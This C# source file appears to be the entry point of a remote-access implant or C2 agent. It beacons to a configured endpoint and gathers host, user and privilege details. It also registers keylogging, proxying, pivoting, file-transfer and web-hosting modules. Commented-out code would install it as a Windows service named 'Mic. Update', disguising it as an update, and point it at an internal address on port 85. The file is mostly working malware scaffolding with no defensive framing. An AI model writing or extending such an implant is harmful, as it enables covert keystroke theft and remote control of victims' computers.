using Agent.Communication;
using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

#if SERVICE
using System.ServiceProcess;
#endif

namespace Agent
{
    public class Entry
    {
        //#if SERVICE
        //        #region Nested classes to support running as service
        //        public const string ServiceName = "Mic. Update";

        //        public class Service : ServiceBase
        //        {
        //            public Service()
        //            {
        //                ServiceName = Program.ServiceName;
        //            }

        //            protected override void OnStart(string[] args)
        //            {
        //                args = new string[] { "http://172.16.1.100:85" };
        //                Program.Start(args);
        //            }

        //            protected override void OnStop()
        //            {
        //                Program.Stop();
        //            }
        //        }
        //        #endregion
        //#endif

        //        static void Main(string[] args)
        //        {
        //#if SERVICE
        //            // running as service
        //            using (var service = new Service())
        //                ServiceBase.Run(service);
        //#else
        //            // running as console app
        //            Start(args);
        //#endif

        //        }

#if DEBUG
        static string[] _args = new string[0];
#endif

        public static void Main(string[] args)
        {
#if DEBUG
            _args = args;
            Start();
#endif
        }



        static Thread s_agentThread = null;

        public static void Start()
        {
            string connUrl = Properties.Resources.EndPoint;

#if DEBUG
            Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));

            if (_args.Count() != 0)
                connUrl = _args[0];
#endif
            var connexion = ConnexionUrl.FromString(connUrl);

            Debug.WriteLine($"Endpoint is {connUrl}.");

            if (!connexion.IsValid)
            {
                Debug.WriteLine($"Endpoint {connUrl} is not valid, quiiting...");
                return;
            }

            var metaData = GenerateMetadata(connexion.ToString());



            ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
            ServiceProvider.RegisterSingleton<IFileService>(new FileService());

            ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
            ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
            ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());


            var commModule = CommunicationFactory.CreateCommunicator(connexion);
            var agent = new Models.Agent(metaData, commModule);

            s_agentThread = new Thread(agent.Start);
            s_agentThread.Start();
            s_agentThread.Join();
        }

        private static void Stop()
        {
            // onstop code here
            s_agentThread.Abort();
        }


        static AgentMetadata GenerateMetadata(string endpoint)
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            AgentMetadata metadata = new AgentMetadata()
            {
                Id = ShortGuid.NewGuid(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                Integrity = integrity,
                EndPoint = endpoint,
                Version = "Net v8.0",
            };

            return metadata;
        }
    }
}
